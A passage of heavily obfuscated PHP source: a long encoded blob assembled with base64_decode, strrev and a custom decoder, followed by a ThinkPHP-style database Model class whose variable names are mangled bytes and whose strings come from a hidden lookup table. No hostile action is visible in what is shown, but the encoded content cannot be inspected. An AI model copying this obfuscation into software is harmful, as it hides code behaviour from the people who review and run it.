4\x3c\x23\x0\xdc\x39"."\x29\x8f\x79\xc\x2c\xc2\x19\xfe\x6\x61\x67\xc5\xd5\x7f\x14\xac\x13\xd4\xd2\xb2\xbc\x9f\xdf\x7e\xc\xb2\x34\x95\x1c\xf\xe5\xb9\x63\xac\xa3\x31\x6f\x9\x43\x8a\xa9\x21\x6f\x62\x35\xf\x6\x7b\x4"."\163\314\327\5\245\64\76\42\52\10\70\75\373\266\212\307\222\144\332\104\303\201\142\121\216\372\131\4\13\313\163\106\322\317\351\0\25\240\373\122\302\140\211\145\41\124\310\5\307".base64_decode('2jyuBGwqR8BjiIQiXm3YDUd1cSAPLLNSJaNoOygYfSezhrzPM6yNaTRLjQIH/pYa4g==')."\266\276\6\121\54\232\302\310\26\157\312\62\114\263\224\222\236\153\251\41\315\265\206\164\35\225\47\124\251\332\107\120\301\32\205\321\315\274\306\107\254\144\233\150\273\344\106\60\360".base64_decode('WlhfDOwEAj1wQXHkOvo7+0iGM+RZu5xeolrQhEKRq7EMFuTQTPBqWW8smogG2dNGTg==')."\211\17\205\55\140\354\256\105\215\274\304\261\210\331\262\160\145\1\226\203\63\20\176\200\300\274\227\312\205\2\327\273\302\230\311\167\271\226\352\177\372\311\271\131\117\17\116\223\256"."\364\153\354\206\5\350\50\275\62\212\17\225\155\261\321\142\277\370\11\154\202\153\1\130\162\60\210\335\33\352\151\137\77\65\4\156\151\144\226\14\114\313\113\30\76\261\234\162\212"."\x82\x37\x81\x41\x3e\xea\x68\xa5\xfb\x81\x50\x8a\x35\x54\x8b\x2f\x5\xe0\x49\x97\x5a\x4f\x6d\x9d\xaf\xa1\xbe\xb6\x32\x85\xea\xd3\x39\xd3\xb1\x72\x8b\x7a\x4c\x1c\x25\xc2\x3\x2a\xb0\x99\x13\x8b\xa1"."\x60\x24\x1c\xea\x49\xa8\x61\xd8\xc7\xe7\x35\x2d\xf6\x35\xa\x33\x1e\xc3\x12\x3e\x41\x69\x38\xc8\xb5\xa\xd0\x41\x19\x8f\xaa\xcf\xd1\xad\x2a\x43\x43\x85\xb3\x9\xae\x1c\xa6\x17\x1c\x22\x24\x3a\xa4"."\71\223\271\222\154\152\154\154\364\66\316\103\377\63\365\146\346\300\256\231\271\73\220\262\64\66\66\223\377\151\2\221\230\2\12\72\123\20\361\143\124\33\62\214\353\72\64\10\166"."\xc9\xbc\x51\x28\x33\x96\xb3\x3f\x88\xed\xb4\x14\xdc\x34\x98\x16\xa1\xdc\x86\xb0\x8f\x78\x78\x64\x4\xd4\xf1\xb4\x9b\x42\x6e\x8\x21\xa6\xbb\x7\x81\x5f\xbd\x2\x3e\x33\xa1\x22\xf5\xce\xcb\x36\x45"."\xd4\x90\x2c\x19\x14\x68\x2f\x37\x2\x44\xd9\xc4\xaa\x59\x4a\xed\x2f\x5b\x78\xa3\x42\x85\x74\xbf\xfc\x31\x1f\x1b\x5c\xa\x14\x7e\xaa\xbd\x2c\xc1\x2b\xbf\x15\x1\x85\xe8\xd6\x28\x2e\x17\x1c\x4d\x43"."\145\234\256\43\61\4\361\60\51\336\117\14\220\4\106\230\215\225\334\141\342\250\174\207\100\222\271\45\35\211\345\270\333\1\34\355\341\65\321\47\111\250\165\62\214\141\225\125\70".base64_decode('ZI6rggvB0WN4jAwpPlAyNExL1o54XNnuI2XnQjahHwDqDsQWf8TIOex+VamoPLZLcQ==')."\106\326\223\204\263\44\256\10\321\257\0\177\230\205\252\37\262\266\51\100\121\150\224\170\255\46\217\107\122\215\321\346\31\25\223\153\273\47\226\314\221\103\32\353\126\372\141\61\151"."\246\230\210\74\376\71\172\71\14\22\142\0\52\334\17\162\277\221\122\5\356\44\127\231\0\225\254\127\24\0\170\145\156\162\1\121\45\67\206\273\162\23\17\221\101\356\10\127\166"."\33\111\257\373\45\25\23\13\374\365\213\373\175\126\307\230\164\326\364\25\113\146\26\315\272\45\17\32\202\367\126\7\363\354\225\71\253\144\342\255\227\363\311\100\174\325\301\136\171"."\5\164\26\306\303\232\170\144\132\312\52\216\176\22\320\271\232\245\204\40\177\77\111\6\342\263\253\254\321\101\316\17\316\72\360\241\330\11\341\55\373\14\244\143\302\14\33\136\4".base64_decode('lrUQaTZBkbCgSZZ3qw40YbjKFEjwCIkbWyecwqi4wXF/lCCELqezB4qBFJJFhSuIsA==').base64_decode('hzbjDi/LgKbNjBeRiznTXj71HBY4j+XCw8qlpfI9AR5SVZYE4RXdxR+9rYKITmSrwA==').strrev('>®¸BåhNÄ{ˆ™¯'."\0".'.U\';l›*Á/¡X0zZÃÎƒEvv¸b”)9š'."\n".'ão²*')."\x17\x89\x5a\xe9\xa0\x88\xbc\xad\x94\x75\x63\x4a\x6c\xca\x1c\x5f\x13\x28\xd8\xcd\x61\x4f\x18\x50\x7a\x2c\xae\x63\xfd\xd0\xed\x7e\xd4\xad\x41\x74\xa8\x11\xbb\x9\x4c\x48\x3f\xa5\xc6\xac\x4e\xdc\x64".strrev('YPWAù´Ç”~P/!ÜkìñæÅIWŞ\\J\\Í!Pg°†&ë´"¹+ÚUİÎ(üÙ¥')."\104\42\62\177\233\240\105\274\313\105\123\35\167\217\222\63\160\236\25\65\203\65\136\143\155\43\312\144\304\145\272\164\66\167\105\335\252\167\270\204\304\321\240\250\264\363\222\175\337".base64_decode('Zls386guVNZIUBDgly86lQVOEXgUlzSdqrQPauV14hYUhMYcMDAlPWWW0nhDlLxOFA==')."\xec\x98\x9e\x95\xa3\x11\x93\x4b\xbc\xf0\x85\x62\xb5\x2a\xb0\xcb\x21\x89\xec\xe0\x55\x18\x48\xd9\x65\xd9\x81\x91\xe4\xd1\x1d\xc5\x24\x7\xfd\x12\x23\xea\x9d\xa7\x70\xe\x56\xa5\x35\xd3\xc8\x5c\x29"."\x81\xe4\xaf\xc6\xcc\xba\x64\xb2\x92\x59\x9\x91\x41\xc5\xcb\x49\x7e\xb\xe6\x62\x31\x99\xa5\x8a\x22\x73\x70\xcc\xf4\x4\x57\x40\x3c\xb8\xe0\x1e\x58\x72\x1a\xaa\x16\x7b\x52\x16\x3d\x93\x8b\x90\x6f"."\126\24\241\151\230\211\22\176\120\344\24\13\173\336\357\143\263\130\55\245\312\247\110\222\64\242\51\356\243\12\106\107\14\22\44\114\352\114\327\323\73\257\311\313\174\12\312\146\54"."\xec\x70\x6\xfb\x8\x5a\x58\x12\x1a\xe0\xe3\x2d\x23\x63\xa0\x29\x9\xf9\x44\x1e\x53\xba\x4b\x24\xbe\x51\x84\x17\x8\xe2\x6\x86\xcf\x27\xf1\x17\xc3\x63\x25\x89\x97\xd0\xb9\x16\x25\x71\x9c\x22\x93"."\165\241\332\100\225\53\161\206\276\152\351\164\204\160\162\273\103\35\326\225\1\255\17\147\72\70\347\27\215\241\276\133\114\207\226\222\253\22\170\350\101\176\176\200\224\22\375\20\72".base64_decode('wQhk0icApIERKhrUpQxTbuZEToATJgdWqnlgrIQqqYEvnHjr6rGBr0Ou2D3JzTCxpg==').strrev('èO¥~¦AZŸ”\'—ÆÔız»{Ô—VÌësÄÒaš¡ËNG*XG%¬¹¤Ş')."\160\300\33\317\33\51\45\22\355\14\7\3\221\366\160\174\245\222\325\155\105\350\243\220\207\72\234\113\231\310\203\351\300\63\254\116\362\327\44\160\320\233\104\47\6\157\232\237\252"."\54\161\176\222\236\107\227\336\333\162\126\113\361\117\57\125\324\130\300\46\70\271\212\62\130\312\135\45\167\116\310\164\245\314\305\222\136\231\177\122\307\12\121\122\213\245\2\345\52"."\255\201\374\325\277\100\136\372\220\163\43\106\110\57\114\327\170\243\60\146\130\206\130\370\254\304\244\134\173\240\275\73\334\243\6\42\221\350\152\207\36\241\220\357\227\270\310\44\55".base64_decode('v7oizYyYBPr1Sldv4J5KdnXvEqPQ6ZO9/hXZhRW8DcmfZ6BR6Y2kYkkzLF0C0Ad8Gg==')."\xc0\xe2\x45\xcb\xe5\x1c\x2f\x1e\xe6\x32\x52\xb4\xec\xdc\x59\xab\x7e\x4a\xa5\x1f\x60\x30\xc9\xc3\x60\xb5\xc\xb1\x70\x67\x57\xe2\x7f\xdc\x54\x23\x2d\x7c\x6a\x19\x69\xa6\x18\xc3\xd\x14\xe9\xcb\xd".base64_decode('Qfl1TPbNinegPvdFKY+44lOJpyH2dJ1JjkPAq1NYOKpSB2riE4g7KU0W5TtWf9rPhw==').base64_decode('mAawE8MQu9jDEXEwwdmhNvw5elxFp3AsMWRHGCZ9Q3QCxtmhY+B6G8utRet4+ariGw==')."\344\115\6\232\106\56\231\120\316\101\321\71\24\343\157\260\210\242\356\224\52\15\100\311\212\220\151\361\14\112\213\322\110\237\151\343\357\153\50\313\230\271\265\370\0\161\360\25\312"."\27\155\307\121\276\113\126\245\227\346\206\2\10\247\43\216\152\130\321\313\314\117\126\0\34\202\254\10\153\27\127\172\304\257\213\24\62\246\74\176\204\40\143\273\10\372\234\42\225".base64_decode('GXjQ0UG3K59iosX/TwrSxLjkW9JZSWWDLPdWJ9gu/MrUkDnufGMRQ9zvSjlelJIWDQ==')."\261\12\226\337\300\162\26\362\124\274\362\242\220\347\161\25\204\352\60\213\330\225\24\73\223\222\314\322\247\347\320\237\1\370\145\333\231\273\21\224\120\301\47\353\71\122\5\207\214"."\134\272\304\325\231\4\240\133\27\202\2\122\12\153\364\150\354\31\140\362\376\134\73\243\311\360\260\114\265\307\306\260\343\76\347\373\70\342\331\41\261\167\72\237\141\341\227\362\226"."\130\14\226\355\170\370\47\141\46\264\254\207\162\144\230\252\211\130\333\244\34\226\25\161\111\57\120\42\23\346\245\371\174\57\227\62\260\7\374\322\36\362\236\34\45\165\356\227\153".base64_decode('pJXG6adcOpszk1ouRhX+HFY0JXSa0tke4MhGQX6tWBRXF/KWif51WC9CWl+iSyU2+A==').base64_decode('KtUkiAucky4OKRAuEcuFML1CcUBL0jlP9spKr1WEvRxkR+3spTemMGBylewWm4vEOw==')."\xa4\xe7\xe2\xfd\x95\xb7\xde\x58\x95\x11\x28\xa\x79\x86\x5a\x68\x84\x10\xfb\x78\xf9\x20\x6\x19\x94\x65\x8a\x40\xd\xc7\x42\xc6\xa8\x84\xb8\x61\xfa\x62\x1f\xa1\x14\x32\xe3\xfe\x19\x50\xe9\x55\x25".base64_decode('eBmw2iNJFPPJT7ue4YcaHBebu+xHRCjIuB/tq3yAkD02yJYOvDRY5fnAaV8f9AjTyA==').base64_decode('z3p7SRjwOV+Xxv3grAE/N1QcPdynDj6srgIx9yAnzEr5sNALcLyNKPUaSFvl+4rSMA==').base64_decode('SP0ul3IeoiLhYX74qj7R6HgJyj2hVR55/NwKQc+aHLrSTqrXvCxZYjfM7myGA3fVkg==')."\56\214\173\250\317\323\212\15\142\155\76\335\64\177\341\321\262\160\103\114\241\270\167\145\36\354\351\17\160\53\2\51\24\47\32\52\314\321\252\274\372\111\242\123\145\276\362\165\120"."\xd7\xe\xf0\x3f\x5b\x30\xe2\xf4\x40\xb3\x4a\xa\xe9\x95\xef\x28\x57\x8c\x0\xc1\x53\x49\x7f\x4b\xda\x10\x5d\xca\x38\x26\xd6\x8f\xb1\xc4\xaa\xa3\x5b\xa0\x78\x5\xd4\xf9\x2d\xca\x3e\x54\xe9\x87\xb4"."\357\211\305\102\137\164\64\163\370\214\235\307\262\173\273\244\71\17\224\325\316\115\144\44\330\41\315\40\257\241\353\356\266\223\201\1\151\212\110\226\16\126\162\215\266\351\26\5\341"."\342\170\137\44\142\315\150\201\171\371\307\306\340\142\265\111\224\350\177\60\201\354\214\104\217\123\102\117\13\167\337\161\264\166\216\202\177\5\43\63\125\136\357\224\264\130\76\243\17"."\x94\xd3\xe3\x67\x43\xaf\x66\x7b\x25\xe4\x94\x44\x89\xba\x1d\x25\x93\xd\xe4\x42\x1c\x61\x9d\xfd\x76\x55\x8f\x8a\x89\x3a\x6\x3d\xca\x74\x99\x2a\xd9\x3d\xe9\x91\x4f\xe1\x3a\x4c\x62\xf4\x70\x69\x66".base64_decode('LTqNBIAYKzpZJvlxQmLwJzxlkKXrWMaSX2PZYI5UJK+Pyqqlpx6FhIiIlKBHsLiJsg==')."\3\151\146\240\223\333\131\152\222\322\235\123\154\205\207\132\172\240\327\224\303\142\12\360\26\20\145\36\142\321\327\35\307\116\24\157\167\75\345\114\310\225\373\175\147\66\104\204\106"."\x8\xf2\x27\x99\xeb\x3a\xce\x38\xfc\xb1\x3b\xc7\x99\xc7\x72\xbf\x78\x89\x38\x3f\xd9\xe3\x33\x8a\xba\xdf\x2\x6\x3a\x49\x6c\x72\xe8\xd7\xa4\x9d\x56\x6c\xaa\x22\xd4\x53\xce\x8b\x88\x24\xeb\x25\xc7"."\x2b\x9e\xe8\xb0\x6a\xc6\xfe\xb0\x5c\x24\x81\xd9\x4a\x5b\xae\xf7\x6e\xa9\xff\x5d\x1a\x66\xa7\x80\xff\xeb\xc7\x1e\xff\x5f\xbd\xf1\xb8\xb0\x91\x49\xe5\x1d\x4f\x40\x77\x2\x2f\xce\xd8\xbf\x29\xc9\xdf"."\67\225\10\273\372\341\334\115\17\0\54\342\157\237\113\161\256\305\315\174\242\61\127\151\32\273\31\323\162\71\151\317\255\176\172\251\170\150\27\41\337\10\177\265\265\132\304\155\363"."\xe7\x7e\x74\xb7\x9f\xbd\x4f\x4f\xde\xd3\x1d\xac\x96\x51\x90\x21\x7e\x48\xaa\x82\xc7\x14\xc4\x78\x63\xe9\xe5\x75\x23\x35\x52\xe5\x5a\x9b\x68\xaa\x3a\xfd\x65\x4b\xbc\x48\x45\x36\xd1\x6\xc4\xb2\x30"."\147\163\176\26\112\341\323\41\361\0\1\243\47\33\353\106\213\354\34\131\17\104\177\160\5\43\116\304\63\0\320\50\231\56\71\100\25\324\54\341\230\23\7\120\36\156\230\103\154".strrev(';®\'U}üuW^yø¡û£|.ş-Âç•‚.@tæ–T9jWäëcÉdÍ(¸õÛ¢QÓ¦Ìî')._kodDe('KvASjphcFbh1uKS9d7ykBFkJrUrqlYoRbG0LTZrJTSvLiGPcBITVEjBCgIrotkAuC5U=')."\134\12\44\351\54\113\357\233\127\260\172\24\74\307\127\261\111\61\222\351\230\51\254\112\307\33\142\230\304\357\76\53\332\327\135\107\254\267\0\321\321\341\244\303\24\50\43\75\66".base64_decode('jhem8IeJNbSJPFLmA5jtpGSPACCH1NCSH1txlsQWJs4luLxatpRZsqRsHF4tL0ZMWQ==').base64_decode('KiKn4YeibccUiScU3E8nEFkBPf47pABwbSyDpGtUxMqnna/CkEQCZq5ToQbpItB5Dw==')."\xcb\x9d\xc4\x57\x90\xdb\xb2\x11\x91\x92\x49\x29\xe6\x91\xf\xfd\x62\xfb\xd2\xb0\x70\xb8\x41\x92\xe9\x15\x47\x60\x4c\xe3\x3e\x6d\xdc\xa5\x9c\xcf\xd3\x4b\xb7\xb6\x29\x82\x90\xa1\xca\x8b\x39\x71\x5f"."\50\61\53\254\30\76\147\211\175\304\5\257\366\332\172\106\33\23\234\226\340\364\323\351\16\155\254\112\326\64\73\353\160\50\202\360\254\204\123\223\114\263\205\155\204\76\356\176\216"."\332\47\233\163\73\62\126\102\205\351\266\124\136\134\321\210\156\142\130\265\356\223\205\346\54\56\233\206\163\244\22\40\372\232\6\127\161\220\116\125\130\7\104\350\76\320\256\160\341".strrev('Õâ´íEòuR"ç (Hf–V2ó´”ü–I\\;c'."\r".'9b\':ê¯*£ò†sãgÓ¤ø')."\77\42\260\322\71\304\222\5\277\110\140\73\244\351\30\174\211\104\362\216\101\316\230\234\350\150\216\173\152\311\261\106\240\57\5\346\211\220\230\246\5\234\111\64\277\356\152\275\134".strrev('j¨¶†R¬ÂH’=¢¤¨©“îÖ6ZİÃ÷ªC`ÅRğ•‰•`Î’†ãà8>BZ3İÀ')."\61\232\204\113\12\136\330\121\166\232\41\300\145\151\22\56\133\221\314\12\127\214\53\51\147\153\145\153\232\356\125\16\36\110\72\322\125\72\54\344\1\122\326\351\306\263\152\346\312"."\317\1\46\272\163\23\321\110\365\126\10\211\206\353\66\276\132\53\252\146\236\266\25\42\267\153\167\250\106\203\131\112\25\252\113\51\312\264\32\52\102\153\243\222\374\213\264\52\72".base64_decode('JPSTeGuXHXlVSZYVUqqrrMSqUgzLqUvigsvjBn5ggSkDZESn1JwxInT1mKr+HMe2UA==')."\x2e\x8c\x14\x4c\xbe\xd5\xa4\x85\x2a\x26\x56\x23\xf\x94\xdc\xe3\x5c\x51\x9b\x13\x8d\xb\x65\xc9\xb5\x6e\x55\xcb\x1\xf\x96\x29\x54\x9e\xde\x73\x1a\x37\xd6\x12\xea\x4c\xf4\xb8\x65\xda\x46\x4a\x77".base64_decode('+u+V/XnRdPaRnCSwdMkKhYTDoetQRYJGQMAOCrE9rU9idAROOAx7KHsBtx30ojSILw==')."\344\371\25\31\361\75\113\267\143\232\34\67\113\266\7\247\45\314\42\371\155\63\155\133\50\16\120\221\2\341\41\361\236\352\221\364\142\120\110\334\207\341\106\221\213\26\202\266\204"."\xfa\x90\x20\x5c\xd9\xe2\xb3\x7a\x5c\xa7\xa9\x84\x66\x39\x22\xf8\x2\x87\x47\xe4\x2d\x13\xae\x6e\x3b\xca\xae\xcb\x65\x1\x40\x7\xe3\xa4\x39\xc1\x9c\x68\x61\xff\x2\xa2\x3d\xe2\x8a\x47\x73\xf3\x89"."\202\305\1\124\224\265\174\210\27\7\313\117\123\374\360\72\204\227\324\1\317\325\371\206\213\131\107\161\372\274\26\327\306\375\254\32\100\314\53\252\240\256\341\211\314\15\14\217\342"."\211\170\105\122\157\40\36\137\35\215\265\123\117\362\25\311\244\224\244\65\125\221\324\333\25\355\231\56\55\324\35\10\107\52\322\260\202\125\217\52\334\261\321\244\160\57\151\45\271"."\245\234\256\25\341\340\112\321\22\162\37\56\156\17\212\103\46\273\24\140\267\53\161\55\307\344\3\222\164\131\317\13\77\174\242\214\123\354\41\317\253\305\34\146\362\200\363\131\46"."\227\36\43\103\130\250\10\53\107\365\100\335\261\42\100\261\147\175\276\356\71\57\56\56\370\175\16\105\0\11\116\326\6\41\66\22\316\311\173\62\1\64\124\35\40\131\332\134\171"."\x13\x42\x52\xc5\x0\xe0\x86\x1d\x63\x82\x66\xdd\xb0\x99\x94\x6e\x3a\xe8\x49\x8\x4c\x7f\x61\x48\x25\x5\x38\x1a\x76\x24\xdb\x5a\xb6\xea\x7d\x38\x95\x2a\xe2\xd5\x2f\xe4\x7d\xff\x1b\x3e\x32\x23\x13"."\xd8\xaf\x0\x0", 10, -8))); goto CÏÓ”ÀùÔÙ; Eï ßäïï: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\162\144\x65\x72", "\x61\x6c\151\141\x73", "\150\141\166\x69\156\147", "\x67\x72\157\x75\160", "\154\x6f\x63\153", "\144\x69\x73\x74\151\x6e\143\164", "\141\165\x74\157", "\x66\x69\x6c\164\145\x72", "\166\141\154\x69\144\x61\x74\145", "\x72\x65\163\165\x6c\164", "\x62\151\x6e\x64", "\164\x6f\x6b\145\156"); public function __construct($¥Ÿ´ûÅ¥ = '', $çİç‰¨ü = '', $¬ó¸öÊ© = '') { $è€¢­Ûó =& $_SERVER[ò«¥Ê‡å]; $this->_initialize(); if (!empty($¥Ÿ´ûÅ¥)) { if (strpos($¥Ÿ´ûÅ¥, $è€¢­Ûó[10])) { list($this->dbName, $this->name) = explode($è€¢­Ûó[10], $¥Ÿ´ûÅ¥); } else { $this->name = $¥Ÿ´ûÅ¥; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($çİç‰¨ü)) { $this->tablePrefix = $è€¢­Ûó[12]; } elseif ($è€¢­Ûó[12] != $çİç‰¨ü) { $this->tablePrefix = $çİç‰¨ü; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($è€¢­Ûó[290]); } $this->db(0, empty($this->connection) ? $¬ó¸öÊ© : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $§Êî‰¿Ö =& $_SERVER[ò«¥Ê‡å]; if (empty($this->fields)) { if (think_config($§Êî‰¿Ö[291])) { $¼Ï¥ˆªÛ = $this->dbName ? $this->dbName : think_config($§Êî‰¿Ö[292]); $™Öğ’î = think_var_cache($§Êî‰¿Ö[293] . strtolower(get_path_this($¼Ï¥ˆªÛ) . $§Êî‰¿Ö[10] . $this->name)); if ($™Öğ’î) { $“’ãĞàú = think_config($§Êî‰¿Ö[294]); if (empty($“’ãĞàú) || $™Öğ’î[$§Êî‰¿Ö[295]] == $“’ãĞàú) { $this->fields = $™Öğ’î; return; } } } $this->flush(); } } public function flush() { $ÃŸü ³ =& $_SERVER[ò«¥Ê‡å]; $this->db->setModel($this->name); $—‰è = $this->db->getFields($this->getTableName()); if (!$—‰è) { return !1; } $this->fields = array_keys($—‰è); $this->fields[$ÃŸü ³[296]] = !1; foreach ($—‰è as $úöáİÓå => $‹Ú¿Ê›) { $ÉƒíÕ¬³[$úöáİÓå] = $‹Ú¿Ê›[$ÃŸü ³[33]]; if ($‹Ú¿Ê›[$ÃŸü ³[39]]) { $this->fields[$ÃŸü ³[297]] = $úöáİÓå; if ($‹Ú¿Ê›[$ÃŸü ³[42]]) { $this->fields[$ÃŸü ³[296]] = !0; } } } $this->fields[$ÃŸü ³[298]] = $ÉƒíÕ¬³; if (think_config($ÃŸü ³[294])) { $this->fields[$ÃŸü ³[295]] = think_config($ÃŸü ³[294]); } if (think_config($ÃŸü ³[291])) { $è³´ÓÏÅ = $this->dbName ? $this->dbName : think_config($ÃŸü ³[292]); think_var_cache($ÃŸü ³[293] . strtolower(get_path_this($è³´ÓÏÅ) . $ÃŸü ³[10] . $this->name), $this->fields); } } public function switchModel($·şÃ†—, $…‚·ó¾Ñ = array()) { $Ü¥€öà„ =& $_SERVER[ò«¥Ê‡å]; $œ—í–²Û = ucwords(strtolower($·şÃ†—)) . $Ü¥€öà„[299]; if (!class_exists($œ—í–²Û)) { think_exception($œ—í–²Û . think_lang($Ü¥€öà„[300])); } $this->_extModel = new $œ—í–²Û($this->name); if (!empty($…‚·ó¾Ñ)) { foreach ($…‚·ó¾Ñ as $ôòÂùÉÉ) { $this->_extModel->setProperty($ôòÂùÉÉ, $this->{$ôòÂùÉÉ}); } } return $this->_extModel; } public function __set($”ˆêšÜ, $©•ú¨é) { $this->data[$”ˆêšÜ] = $©•ú¨é; } public function __get($ö £ã¼) { return isset($this->data[$ö £ã¼]) ? $this->data[$ö £ã¼] : null; } public function __isset($ï­ú³¬Ó) { return isset($this->data[$ï­ú³¬Ó]); } public function __unset($»˜«İäÉ) { unset($this->data[$»˜«İäÉ]); } public function __call($½ÈåÆì, $¤è›µ–í) { $ÖÑéş± =& $_SERVER[ò«¥Ê‡å]; if (in_array(strtolower($½ÈåÆì), $this->methods, !0)) { $this->options[strtolower($½ÈåÆì)] = $¤è›µ–í[0]; return $this; } elseif (in_array(strtolower($½ÈåÆì), array($ÖÑéş±[301], $ÖÑéş±[302], $ÖÑéş±[303], $ÖÑéş±[304], $ÖÑéş±[305]), !0)) { $²¬Áö´Œ = isset($¤è›µ–í[0]) ? $¤è›µ–í[0] : $ÖÑéş±[205]; $²¬Áö´Œ = $this->db->parseKey($²¬Áö´Œ); return $this->getField(strtoupper($½ÈåÆì) . $ÖÑéş±[306] . $²¬Áö´Œ . $ÖÑéş±[307] . $½ÈåÆì, $ÖÑéş±[301]); } elseif (strtolower(substr($½ÈåÆì, 0, 5)) == $ÖÑéş±[308]) { $²¬Áö´Œ = think_parse_name(substr($½ÈåÆì, 5)); $İâ™¬ªï[$²¬Áö´Œ] = $¤è›µ–í[0]; return $this->where($İâ™¬ªï)->find(); } elseif (strtolower(substr($½ÈåÆì, 0, 10)) == $ÖÑéş±[309]) { $Ş‹à™…» = think_parse_name(substr($½ÈåÆì, 10)); $İâ™¬ªï[$Ş‹à™…»] = $¤è›µ–í[0]; return $this->where($İâ™¬ªï)->getField($¤è›µ–í[1]); } elseif (isset($this->_scope[$½ÈåÆì])) { return $this->scope($½ÈåÆì, $¤è›µ–í[0]); } elseif (method_exists($this, $½ÈåÆì)) { array_unshift($¤è›µ–í, $½ÈåÆì); return call_user_func_array(array($this, $ÖÑéş±[310]), $¤è›µ–í); } else { return call_user_func_array(array(parent, $½ÈåÆì), $¤è›µ–í); } } protected function call() { $‹í›¤¶§ =& $_SERVER[ò«¥Ê‡å]; $æÇŞÂ½Â = func_get_args(); $¶Â®ş±– = array_shift($æÇŞÂ½Â); $Ğ®ÃÏÚı = $¶Â®ş±–; if (is_array($¶Â®ş±–)) { $Ğ®ÃÏÚı = $¶Â®ş±–[1]; $¶Â®ş±– = $¶Â®ş±–[0]; } $ºÖüè‰¸ = count($æÇŞÂ½Â) - 1; if (isset($æÇŞÂ½Â[$ºÖüè‰¸]) && $æÇŞÂ½Â[$ºÖüè‰¸] === $¶Â®ş±–) { think_exception(__CLASS__ . $‹í›¤¶§[4] . $¶Â®ş±– . think_lang($‹í›¤¶§[311])); return; } $æÇŞÂ½Â[] = $¶Â®ş±–; if (method_exists($this, $‹í›¤¶§[312])) { $øø…î†± = call_user_func_array(array($this, $‹í›¤¶§[313]), array($Ğ®ÃÏÚı, $æÇŞÂ½Â)); if (!is_null($øø…î†±) && $øø…î†± !== !1) { return $øø…î†±; } } $´ºã‹Œò = call_user_func_array(array($this, $¶Â®ş±–), $æÇŞÂ½Â); if (method_exists($this, $‹í›¤¶§[314])) { $øø…î†± = call_user_func_array(array($this, $‹í›¤¶§[315]), array($Ğ®ÃÏÚı, $æÇŞÂ½Â, $´ºã‹Œò)); if ($øø…î†±) { return $øø…î†±; } } return $´ºã‹Œò; } protected function _initialize() { } protected function _facade($˜¬Œˆåì) { $ĞÍ–¦„  =& $_SERVER[ò«¥Ê‡å]; if (!empty($this->fields)) { foreach ($˜¬Œˆåì as $æ±¸Òõ» => $‰œµÊ÷Ê) { if (is_array($this->fields) && !in_array($æ±¸Òõ», $this->fields, !0)) { unset($˜¬Œˆåì[$æ±¸Òõ»]); } elseif (is_scalar($‰œµÊ÷Ê)) { $this->_parseType($˜¬Œˆåì, $æ±¸Òõ»); } } } if (!empty($this->options[$ĞÍ–¦„ [316]])) { $˜¬Œˆåì = array_map($this->options[$ĞÍ–¦„ [316]], $˜¬Œˆåì); unset($this->options[$ĞÍ–¦„ [316]]); } $this->_beforeWrite($˜¬Œˆåì); return $˜¬Œˆåì; } protected function _beforeWrite(&$Ô¼Šé„™) { } public function add($Š­œÚ = '', $Ê‹Êô‘£ = array(), $Ù ¬æƒ = false) { if (empty($Š­œÚ)) { if (!empty($this->data)) { $Š­œÚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ò«¥Ê‡å][317]); return !1; } } $Ê‹Êô‘£ = $this->_parseOptions($Ê‹Êô‘£); $Š­œÚ = $this->_facade($Š­œÚ); if (!1 === $this->_beforeInsert($Š­œÚ, $Ê‹Êô‘£)) { return !1; } $°ó’é± = $this->db->insert($Š­œÚ, $Ê‹Êô‘£, $Ù ¬æƒ); if (!1 !== $°ó’é±) { $Îåó™‡ˆ = $this->getLastInsID(); if ($Îåó™‡ˆ) { $Š­œÚ[$this->getPk()] = $Îåó™‡ˆ; $this->_after_insert($Š­œÚ, $Ê‹Êô‘£); return $Îåó™‡ˆ; } $this->_after_insert($Š­œÚ, $Ê‹Êô‘£); } return $°ó’é±; } protected function _beforeInsert(&$Ë½ˆß, $¾¶¬¼“š) { } protected function _after_insert($ì¡ÕÂ÷Î, $Ğö¨’é¡) { } public function addAll($ú¶ïß“ú, $õ®–Ñ´ = array(), $¿íˆ¬˜ = false) { $æÉ°º€¬ =& $_SERVER[ò«¥Ê‡å]; if (empty($ú¶ïß“ú)) { $this->error = think_lang($æÉ°º€¬[317]); return !1; } $õ®–Ñ´ = $this->_parseOptions($õ®–Ñ´); foreach ($ú¶ïß“ú as $ö¡§¦²÷ => $îéíäÀ²) { $ú¶ïß“ú[$ö¡§¦²÷] = $this->_facade($îéíäÀ²); } if (method_exists($this->db, $æÉ°º€¬[318])) { $¢‡ğÌ«õ = $this->db->insertAll($ú¶ïß“ú, $õ®–Ñ´, $¿íˆ¬˜); } else { $this->startTrans(); foreach ($ú¶ïß“ú as $ö¡§¦²÷ => $îéíäÀ²) { $¢‡ğÌ«õ = $this->db->insert($îéíäÀ², $õ®–Ñ´, $¿íˆ¬˜); } $this->commit(); } if (!1 !== $¢‡ğÌ«õ) { $ ŸÍ„ŠÈ = $this->getLastInsID(); if ($ ŸÍ„ŠÈ) { return $ ŸÍ„ŠÈ; } } return $¢‡ğÌ«õ; } public function selectAdd($‡î ¨ = '', $æ¿ş¶Ñ÷ = '', $Ú«í‹†¢ = array()) { $à®ÆŒë¹ =& $_SERVER[ò«¥Ê‡å]; $Ú«í‹†¢ = $this->_parseOptions($Ú«í‹†¢); if (!1 === ($Š£¹è×” = $this->db->selectInsert($‡î ¨ ? $‡î ¨ : $Ú«í‹†¢[$à®ÆŒë¹[319]], $æ¿ş¶Ñ÷ ? $æ¿ş¶Ñ÷ : $this->getTableName(), $Ú«í‹†¢))) { $this->error = think_lang($à®ÆŒë¹[320]); return !1; } else { return $Š£¹è×”; } } public function save($Ş¬«ÅÜó = '', $Ô¶×’›ú = array()) { $ğñÛ¦–š =& $_SERVER[ò«¥Ê‡å]; if (empty($Ş¬«ÅÜó)) { if (!empty($this->data)) { $Ş¬«ÅÜó = $this->data; $this->data = array(); } else 